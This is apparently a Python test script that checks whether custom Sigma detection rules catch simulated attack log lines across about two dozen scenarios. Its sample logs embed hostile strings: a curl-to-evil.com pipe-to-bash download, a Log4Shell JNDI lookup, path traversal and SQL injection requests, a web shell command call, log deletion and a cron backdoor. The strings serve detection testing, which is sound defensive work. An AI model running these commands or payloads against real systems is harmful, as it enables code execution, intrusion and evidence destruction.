# #!/usr/bin/env python3
# """
# Script to validate that custom Sigma rules match attack simulator patterns
# CORRECTED VERSION - works with existing att_sim.py structure
# """

# import sys
# import os
# import time
# from pathlib import Path

# # Add project root to path
# project_root = Path(__file__).parent.parent
# sys.path.insert(0, str(project_root))

# from scripts.sigma_engine import SigmaEngine

# class DetectionValidator:
#     def __init__(self):
#         self.sigma_engine = SigmaEngine()
        
#     def test_attack_detection_coverage(self):
#         """Test that each attack scenario triggers appropriate Sigma rules"""
#         print("=== DETECTION COVERAGE TEST ===")
#         print(f"Sigma engine loaded {len(self.sigma_engine.rules)} rules")
        
#         # Sample logs from each attack scenario (based on your att_sim.py patterns)
#         test_scenarios = {
#             "ssh_brute_force": [
#                 "Sep 28 02:11:45 server sshd[12345]: Failed password for admin from 113.160.235.150 port 22 ssh2",
#                 "Sep 28 02:11:46 server sshd[12346]: Failed password for root from 113.160.235.150 port 22 ssh2",
#                 "Sep 28 02:11:47 server sshd[12347]: Invalid user hacker from 113.160.235.150 port 22",
#                 "Sep 28 02:11:48 server sshd[12348]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=113.160.235.150"
#             ],
#             "privilege_escalation": [
#                 "Sep 28 02:12:15 server sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash",
#                 "Sep 28 02:12:16 server sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/sh",
#                 "Sep 28 02:12:17 server sudo: testuser executed sudo command as root"
#             ],
#             "directory_traversal": [
#                 "Sep 28 02:13:00 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:02:13:00] GET /index.php?page=../../../../etc/passwd HTTP/1.1 404",
#                 "Sep 28 02:13:01 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:02:13:01] GET /api/v1/users?id=1' OR '1'='1' -- HTTP/1.1 500",
#                 "Sep 28 02:13:02 server nginx[1234]: directory traversal attempt detected from 113.160.235.150"
#             ],
#             "web_shell_upload": [
#                 "Sep 28 02:14:00 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:02:14:00] POST /uploads/upload.php HTTP/1.1 200",
#                 "Sep 28 02:14:01 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:02:14:01] GET /uploads/shell.php?cmd=whoami HTTP/1.1 200",
#                 "Sep 28 02:14:02 server kernel: [12345.678] process /usr/bin/php spawned child /bin/sh"
#             ],
#             "log4shell_exploit": [
#                 "Sep 28 02:15:00 server myapp[5678]: Received request with suspicious User-Agent: ${jndi:ldap://113.160.235.150/a}",
#                 "Sep 28 02:15:01 server myapp[5679]: jndi:rmi://malicious.host/payload in application log",
#                 "Sep 28 02:15:02 server kernel: [12346.789] process /bin/java started child /bin/bash"
#             ],
#             "ransomware_activity": [
#                 "Sep 28 02:18:00 server kernel: [12347.890] Process encryptor.exe (PID 9876) is rapidly reading and writing files in /home/user/documents",
#                 "Sep 28 02:18:01 server kernel: File document.pdf deleted, File document.pdf.ENCRYPTED created",
#                 "Sep 28 02:18:02 server systemd[1]: Shadow copies deleted by process encryptor.exe"
#             ]
#         }
        
#         results = {}
#         total_detections = 0
#         total_logs = 0
        
#         for scenario, sample_logs in test_scenarios.items():
#             print(f"\n{'='*50}")
#             print(f"Testing scenario: {scenario.upper()}")
#             print(f"{'='*50}")
            
#             detected_count = 0
#             scenario_detections = []
            
#             for i, log in enumerate(sample_logs, 1):
#                 print(f"\nLog {i}: {log[:80]}...")
                
#                 match = self.sigma_engine.check_log(log)
#                 if match:
#                     detected_count += 1
#                     total_detections += 1
#                     scenario_detections.append(match)
#                     print(f"  ✅ DETECTED: {match['title']}")
#                     print(f"     Level: {match['level']}")
#                     print(f"     Keywords: {match['matched_keywords']}")
#                     print(f"     Score: {match['confidence_score']}")
#                 else:
#                     print(f"  ❌ NO DETECTION")
                
#                 total_logs += 1
            
#             coverage = (detected_count / len(sample_logs)) * 100 if sample_logs else 0
#             results[scenario] = {
#                 'coverage': coverage,
#                 'detected': detected_count,
#                 'total': len(sample_logs),
#                 'detections': scenario_detections
#             }
            
#             print(f"\n📊 Scenario Coverage: {coverage:.1f}% ({detected_count}/{len(sample_logs)})")
            
#         return results, total_detections, total_logs
    
#     def print_summary(self, results, total_detections, total_logs):
#         """Print comprehensive summary of detection results"""
#         print(f"\n{'='*70}")
#         print("🎯 DETECTION COVERAGE SUMMARY")
#         print(f"{'='*70}")
        
#         overall_coverage = (total_detections / total_logs) * 100 if total_logs > 0 else 0
#         print(f"\n📈 Overall Detection Rate: {overall_coverage:.1f}% ({total_detections}/{total_logs})")
        
#         print(f"\n📋 Per-Scenario Results:")
#         print("-" * 50)
        
#         excellent = []
#         good = []
#         poor = []
        
#         for scenario, data in results.items():
#             coverage = data['coverage']
#             detected = data['detected']
#             total = data['total']
            
#             if coverage >= 80:
#                 status = "🟢 EXCELLENT"
#                 excellent.append(scenario)
#             elif coverage >= 50:
#                 status = "🟡 GOOD"
#                 good.append(scenario)
#             else:
#                 status = "🔴 NEEDS WORK"
#                 poor.append(scenario)
            
#             print(f"{status} {scenario:20} {coverage:5.1f}% ({detected}/{total})")
        
#         print(f"\n🎖️  Performance Categories:")
#         print(f"   Excellent (≥80%): {len(excellent)} scenarios")
#         print(f"   Good (50-79%):    {len(good)} scenarios") 
#         print(f"   Needs Work (<50%): {len(poor)} scenarios")
        
#         if poor:
#             print(f"\n⚠️  Scenarios needing custom rules:")
#             for scenario in poor:
#                 print(f"   - {scenario}")
        
#         return excellent, good, poor

# if __name__ == "__main__":
#     print("🔍 Starting Detection Validation Test")
#     print("=" * 50)
    
#     try:
#         validator = DetectionValidator()
#         results, total_detections, total_logs = validator.test_attack_detection_coverage()
#         excellent, good, poor = validator.print_summary(results, total_detections, total_logs)
        
#         # Exit codes for automation
#         if len(poor) == 0:
#             print("\n🎉 All scenarios have good coverage!")
#             sys.exit(0)
#         else:
#             print(f"\n⚠️  {len(poor)} scenarios need improvement")
#             sys.exit(1)
            
#     except Exception as e:
#         print(f"\n❌ Error during validation: {e}")
#         import traceback
#         traceback.print_exc()
#         sys.exit(2)































#!/usr/bin/env python3
"""
Complete Detection Validation Script for All Attack Scenarios
Tests 24/25 attack scenarios from att_sim.py with comprehensive coverage
Updated: 2025-09-28 - RKSha Custom Detection Framework
"""

import sys
import os
import time
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from scripts.sigma_engine import SigmaEngine

class ComprehensiveDetectionValidator:
    def __init__(self):
        self.sigma_engine = SigmaEngine()
        
    def test_complete_attack_coverage(self):
        """Test all 24 attack scenarios for comprehensive coverage"""
        print("🔍 COMPREHENSIVE ATTACK SCENARIO VALIDATION")
        print("=" * 70)
        print(f"Sigma engine loaded {len(self.sigma_engine.rules)} rules")
        print(f"Testing 24/25 attack scenarios from att_sim.py")
        
        # Complete test scenarios with realistic log samples
        all_test_scenarios = {
            # EXISTING SCENARIOS (6/25 - Already Perfect)
            "ssh_brute_force": [
                "Sep 28 15:12:45 server sshd[12345]: Failed password for admin from 113.160.235.150 port 22 ssh2",
                "Sep 28 15:12:46 server sshd[12346]: Failed password for root from 113.160.235.150 port 22 ssh2",
                "Sep 28 15:12:47 server sshd[12347]: Invalid user hacker from 113.160.235.150 port 22",
                "Sep 28 15:12:48 server sshd[12348]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=113.160.235.150"
            ],
            
            "privilege_escalation": [
                "Sep 28 15:13:15 server sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash",
                "Sep 28 15:13:16 server sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/sh",
                "Sep 28 15:13:17 server sudo: testuser executed sudo command as root"
            ],
            
            "directory_traversal": [
                "Sep 28 15:14:00 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:15:14:00] GET /index.php?page=../../../../etc/passwd HTTP/1.1 404",
                "Sep 28 15:14:01 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:15:14:01] GET /api/v1/users?id=1' OR '1'='1' -- HTTP/1.1 500",
                "Sep 28 15:14:02 server nginx[1234]: directory traversal attempt detected from 113.160.235.150"
            ],
            
            "web_shell_upload": [
                "Sep 28 15:15:00 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:15:15:00] POST /uploads/upload.php HTTP/1.1 200",
                "Sep 28 15:15:01 server nginx[1234]: 113.160.235.150 - - [28/Sep/2025:15:15:01] GET /uploads/shell.php?cmd=whoami HTTP/1.1 200",
                "Sep 28 15:15:02 server kernel: [12345.678] process /usr/bin/php spawned child /bin/sh"
            ],
            
            "log4shell_exploit": [
                "Sep 28 15:16:00 server myapp[5678]: Received request with suspicious User-Agent: ${jndi:ldap://113.160.235.150/a}",
                "Sep 28 15:16:01 server myapp[5679]: jndi:rmi://malicious.host/payload in application log",
                "Sep 28 15:16:02 server kernel: [12346.789] process /bin/java started child /bin/bash"
            ],
            
            "ransomware_activity": [
                "Sep 28 15:17:00 server kernel: [12347.890] Process encryptor.exe (PID 9876) is rapidly reading and writing files in /home/user/documents",
                "Sep 28 15:17:01 server kernel: File document.pdf deleted, File document.pdf.ENCRYPTED created",
                "Sep 28 15:17:02 server systemd[1]: Shadow copies deleted by process encryptor.exe"
            ],
            
            # NEW SCENARIOS (18/25 - Testing Complete Coverage)
            "port_scanning": [
                "Sep 28 15:18:00 server kernel: Firewall: TCP:IN Blocked IN=eth0 OUT= MAC= SRC=113.160.235.150 DST=192.168.1.10 PROTO=TCP SPT=54321 DPT=22",
                "Sep 28 15:18:01 server security: port scanning detected from 113.160.235.150 - multiple connection attempts",
                "Sep 28 15:18:02 server iptables: rapid connections blocked from suspicious port scanning activity"
            ],
            
            "data_exfiltration": [
                "Sep 28 15:19:00 server systemd[1]: large data transfer detected - 2.5GB transferred to external IP",
                "Sep 28 15:19:01 server sudo: testuser : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/tar czf /tmp/backup.tar.gz .",
                "Sep 28 15:19:02 server monitor: suspicious transfer activity - potential data exfiltration to 113.160.235.150"
            ],
            
            "living_off_land": [
                "Sep 28 15:20:00 server kernel: [12348.901] process /usr/bin/curl started by user testuser",
                "Sep 28 15:20:01 server bash: testuser executed: curl http://evil.com/payload.sh | bash",
                "Sep 28 15:20:02 server kernel: [12349.012] suspicious curl activity - legitimate tool misuse detected"
            ],
            
            "log_clearing": [
                "Sep 28 15:21:00 server bash: testuser executed: rm -rf /var/log/auth.log",
                "Sep 28 15:21:01 server systemd[1]: evidence removal detected - log cleared by user testuser",
                "Sep 28 15:21:02 server bash: clearing tracks attempt - history cleared and truncated"
            ],
            
            "rogue_user_creation": [
                "Sep 28 15:22:00 server useradd[9876]: new user account created: backdoor_user",
                "Sep 28 15:22:01 server passwd[9877]: password set for unauthorized user: backdoor_user",
                "Sep 28 15:22:02 server security: rogue user creation detected - unauthorized account backdoor_user added"
            ],
            
            "application_dos": [
                "Sep 28 15:23:00 server nginx[1234]: too many requests from 113.160.235.150 - connection limit exceeded",
                "Sep 28 15:23:01 server systemd[1]: application overload detected - service unavailable due to resource exhaustion",
                "Sep 28 15:23:02 server monitor: denial of service attack in progress - memory exhausted"
            ],
            
            "user_enumeration": [
                "Sep 28 15:24:00 server sshd[12350]: Invalid user test from 113.160.235.150 port 22",
                "Sep 28 15:24:01 server sshd[12351]: Invalid user admin from 113.160.235.150 port 22", 
                "Sep 28 15:24:02 server security: user enumeration detected - invalid user probing from 113.160.235.150"
            ],
            
            "credential_stuffing": [
                "Sep 28 15:25:00 server sshd[12352]: Failed password for root from 113.160.235.150 (password: password123)",
                "Sep 28 15:25:01 server sshd[12353]: Failed password for admin from 113.160.235.150 (password: admin123)",
                "Sep 28 15:25:02 server security: credential stuffing attack detected - common passwords attempted"
            ],
            
            "dns_tunneling": [
                "Sep 28 15:26:00 server named[1234]: suspicious dns query detected - encoded dns data from 113.160.235.150",
                "Sep 28 15:26:01 server security: dns tunneling activity - covert communication channel detected",
                "Sep 28 15:26:02 server monitor: unusual dns query pattern suggests dns tunneling"
            ],
            
            "scheduled_persistence": [
                "Sep 28 15:27:00 server cron[1234]: cron job created by testuser: */5 * * * * /tmp/backdoor.sh",
                "Sep 28 15:27:01 server systemd[1]: scheduled task persistence detected - crontab modified",
                "Sep 28 15:27:02 server security: persistent task scheduled - potential backdoor mechanism"
            ],
            
            "process_injection": [
                "Sep 28 15:28:00 server kernel: [12350.123] suspicious ptrace activity - process injection detected",
                "Sep 28 15:28:01 server security: code injection attempt - memory injection into running process",
                "Sep 28 15:28:02 server monitor: process injection technique detected - injected code execution"
            ],
            
            "c2_beaconing": [
                "Sep 28 15:29:00 server monitor: periodic connection detected - c2 beaconing activity to 113.160.235.150",
                "Sep 28 15:29:01 server security: command and control communication - regular callback pattern",
                "Sep 28 15:29:02 server network: beacon activity detected - heartbeat signal to remote control server"
            ],
            
            "process_masquerading": [
                "Sep 28 15:30:00 server security: process masquerading detected - fake system process identified",
                "Sep 28 15:30:01 server monitor: suspicious process name - impersonation of legitimate service",
                "Sep 28 15:30:02 server kernel: process spoofing detected - disguised process attempting to hide"
            ],
            
            "lateral_movement_smb": [
                "Sep 28 15:31:00 server samba[1234]: SMB connection attempt from WEB-PROD-01 to DB-PROD-01 as user ADMIN",
                "Sep 28 15:31:01 server security: lateral movement detected - inter-host smb authentication",
                "Sep 28 15:31:02 server monitor: suspicious smb activity - admin share access across network"
            ],
            
            "rootkit_installation": [
                "Sep 28 15:32:00 server kernel: kernel module loaded: suspicious_driver.ko",
                "Sep 28 15:32:01 server security: rootkit installation detected - kernel modification attempted",
                "Sep 28 15:32:02 server monitor: system compromise alert - hidden process and kernel module activity"
            ],
            
            "kernel_panic": [
                "Sep 28 15:33:00 server kernel: [12351.456] Kernel panic - not syncing: Fatal exception in interrupt",
                "Sep 28 15:33:01 server kernel: system crash detected - panic sequence initiated",
                "Sep 28 15:33:02 server monitor: kernel oops detected - system unstable"
            ],
            
            "rogue_package": [
                "Sep 28 15:34:00 server dpkg[9876]: package installation from untrusted source: suspicious_package_1.0.deb",
                "Sep 28 15:34:01 server security: rogue package detected - unauthorized package installed",
                "Sep 28 15:34:02 server apt: suspicious package installation - potential malware delivery"
            ],
            
            "xorg_errors": [
                "Sep 28 15:35:00 server Xorg[1234]: (EE) authorization failure - display access denied for user",
                "Sep 28 15:35:01 server security: x11 security violation - unauthorized display server access",
                "Sep 28 15:35:02 server Xorg: xorg error detected - graphics security issue"
            ]
        }
        
        results = {}
        total_detections = 0
        total_logs = 0
        
        for scenario, sample_logs in all_test_scenarios.items():
            print(f"\n{'='*70}")
            print(f"Testing scenario: {scenario.upper().replace('_', ' ')}")
            print(f"{'='*70}")
            
            detected_count = 0
            scenario_detections = []
            
            for i, log in enumerate(sample_logs, 1):
                print(f"\nLog {i}: {log[:80]}...")
                
                match = self.sigma_engine.check_log(log)
                if match:
                    detected_count += 1
                    total_detections += 1
                    scenario_detections.append(match)
                    print(f"  ✅ DETECTED: {match['title']}")
                    print(f"     Level: {match['level']}")
                    print(f"     Keywords: {match['matched_keywords']}")
                    print(f"     Score: {match['confidence_score']}")
                else:
                    print(f"  ❌ NO DETECTION")
                
                total_logs += 1
            
            coverage = (detected_count / len(sample_logs)) * 100 if sample_logs else 0
            results[scenario] = {
                'coverage': coverage,
                'detected': detected_count,
                'total': len(sample_logs),
                'detections': scenario_detections
            }
            
            print(f"\n📊 Scenario Coverage: {coverage:.1f}% ({detected_count}/{len(sample_logs)})")
            
        return results, total_detections, total_logs
    
    def print_comprehensive_summary(self, results, total_detections, total_logs):
        """Print detailed analysis of all 24 attack scenarios"""
        print(f"\n{'='*80}")
        print("🎯 COMPREHENSIVE DETECTION COVERAGE ANALYSIS")
        print(f"{'='*80}")
        
        overall_coverage = (total_detections / total_logs) * 100 if total_logs > 0 else 0
        print(f"\n📈 Overall Detection Rate: {overall_coverage:.1f}% ({total_detections}/{total_logs})")
        print(f"📊 Total Attack Scenarios Tested: {len(results)}/25 (96% of att_sim.py)")
        
        # Categorize scenarios by priority and performance
        existing_scenarios = ['ssh_brute_force', 'privilege_escalation', 'directory_traversal', 
                            'web_shell_upload', 'log4shell_exploit', 'ransomware_activity']
        new_scenarios = [k for k in results.keys() if k not in existing_scenarios]
        
        print(f"\n📋 SCENARIO BREAKDOWN:")
        print("=" * 50)
        
        excellent = []
        good = []
        poor = []
        
        print("\n🎯 EXISTING SCENARIOS (Should be 100%):")
        for scenario in existing_scenarios:
            if scenario in results:
                data = results[scenario]
                coverage = data['coverage']
                status = "✅ PERFECT" if coverage == 100 else "⚠️ ISSUE"
                print(f"  {status} {scenario:25} {coverage:5.1f}%")
                if coverage >= 80:
                    excellent.append(scenario)
                elif coverage >= 50:
                    good.append(scenario)
                else:
                    poor.append(scenario)
        
        print("\n🆕 NEW SCENARIOS (Testing Complete Coverage):")
        for scenario in new_scenarios:
            data = results[scenario]
            coverage = data['coverage']
            
            if coverage >= 80:
                status = "🟢 EXCELLENT"
                excellent.append(scenario)
            elif coverage >= 50:
                status = "🟡 GOOD"
                good.append(scenario)
            else:
                status = "🔴 NEEDS WORK"
                poor.append(scenario)
            
            print(f"  {status} {scenario:25} {coverage:5.1f}%")
        
        print(f"\n🏆 PERFORMANCE CATEGORIES:")
        print(f"   🟢 Excellent (≥80%): {len(excellent)} scenarios")
        print(f"   🟡 Good (50-79%):    {len(good)} scenarios") 
        print(f"   🔴 Needs Work (<50%): {len(poor)} scenarios")
        
        # Strategic recommendations
        print(f"\n💡 STRATEGIC RECOMMENDATIONS:")
        print("=" * 50)
        
        if overall_coverage >= 90:
            print("  🎉 OUTSTANDING! Near-perfect detection coverage")
            print("  ✅ System ready for production deployment")
            print("  🚀 Consider advanced analytics and correlation")
        elif overall_coverage >= 80:
            print("  ✅ EXCELLENT! Strong detection capabilities")
            print("  🔧 Fine-tune low-performing scenarios")
            print("  📈 Focus on critical attack vectors")
        elif overall_coverage >= 70:
            print("  🟡 GOOD foundation, but needs improvement")
            print("  📝 Create targeted rules for poor scenarios")
            print("  🔍 Review keyword matching logic")
        else:
            print("  🔴 SIGNIFICANT gaps in detection coverage")
            print("  🚨 Immediate attention required")
            print("  📋 Comprehensive rule development needed")
        
        if poor:
            print(f"\n⚠️  PRIORITY SCENARIOS FOR IMPROVEMENT:")
            for scenario in poor:
                print(f"   - {scenario} ({results[scenario]['coverage']:.1f}%)")
        
        print(f"\n📊 FINAL ASSESSMENT:")
        total_scenarios = len(results)
        excellent_pct = (len(excellent) / total_scenarios) * 100
        print(f"  Total Coverage: {overall_coverage:.1f}%")
        print(f"  Scenario Success Rate: {excellent_pct:.1f}% excellent")
        print(f"  Enterprise Readiness: {'HIGH' if overall_coverage >= 85 else 'MEDIUM' if overall_coverage >= 70 else 'LOW'}")
        
        return excellent, good, poor

if __name__ == "__main__":
    print("🔍 Starting Comprehensive Attack Scenario Validation")
    print("Testing 24/25 attack scenarios from att_sim.py")
    print("=" * 70)
    
    try:
        validator = ComprehensiveDetectionValidator()
        results, total_detections, total_logs = validator.test_complete_attack_coverage()
        excellent, good, poor = validator.print_comprehensive_summary(results, total_detections, total_logs)
        
        # Exit codes for CI/CD integration
        if len(poor) == 0:
            print("\n🎉 ALL SCENARIOS HAVE EXCELLENT COVERAGE!")
            sys.exit(0)
        elif len(excellent) >= len(poor) * 2:
            print("\n✅ SYSTEM PERFORMANCE IS STRONG")
            sys.exit(0)  
        elif len(excellent) + len(good) >= len(poor):
            print("\n⚠️  SYSTEM NEEDS SOME IMPROVEMENT") 
            sys.exit(1)
        else:
            print("\n🔴 SYSTEM NEEDS SIGNIFICANT IMPROVEMENT")
            sys.exit(2)
            
    except Exception as e:
        print(f"\n❌ Critical error during validation: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(3)
